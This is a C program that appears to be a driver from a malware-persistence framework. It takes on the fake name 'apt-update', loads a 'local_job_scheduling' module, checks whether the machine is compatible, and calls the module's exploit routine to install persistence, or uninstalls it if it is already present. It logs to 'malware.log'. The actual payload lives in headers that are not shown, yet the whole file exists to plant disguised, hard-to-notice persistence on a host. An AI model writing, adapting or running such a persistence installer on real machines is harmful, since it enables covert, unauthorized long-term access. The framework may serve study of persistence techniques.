// Include needed libraries
#include "../../headers/library/persistency_hub.h"
#include "../../headers/helpers/helpers.h"

// Define constants
#define        FAKE_NAME                         "apt-update"
#define        USED_MODULE                       "local_job_scheduling"
#define        LOG_FILE                          "malware.log"

// Main function
int main(){

	ENVIRONMENT *env = NULL;
	MODULE_WALLET *wallet = NULL;
	LOADED_MODULE *module = NULL;
	LOGGER *logger = NULL;

	// Create logger
	init_logger(&logger, LOG_FILE);

	// Autoset the environment
	autoset_environment(&env, FAKE_NAME);

	// Get all modules into the wallet
	get_all_modules(&wallet);

	// Search module
	if (is_module_present(wallet, USED_MODULE) >= 0){

		// Log the presence of the module
		log_message(logger, "Module '" USED_MODULE "' is present in the wallet");

		// Load module
		load_module(&module, USED_MODULE);

		// Exploit
		if (module->is_installed(env) > 0){

			// Log the presence of the module
			log_message(logger, "Module '" USED_MODULE "' is already installed on this machine");

			// Delete
			module->delete_installed(env);

			// Log the deletion
			log_message(logger, "Module '" USED_MODULE "' was successfully uninstalled");

		}
		else{

			// Check if it is compatible
			if (module->is_compatible(env) >= 0){

				// Log the compatibility
				log_message(logger, "Module '" USED_MODULE "' is compatible with this machine");

				// Exploit
				module->exploit(env);

				// Log the exploitation
				log_message(logger, "Module '" USED_MODULE "' was successfully installed");

			}

		}

		// Unlink
		unlink_module(&module);

	}
	else{

		// Log the absence of the module
		log_message(logger, "Module '" USED_MODULE "' is not present in the wallet");
	}

	// Free
	free_logger(&logger);
	free_environment(&env);
	free_module_wallet(&wallet);

}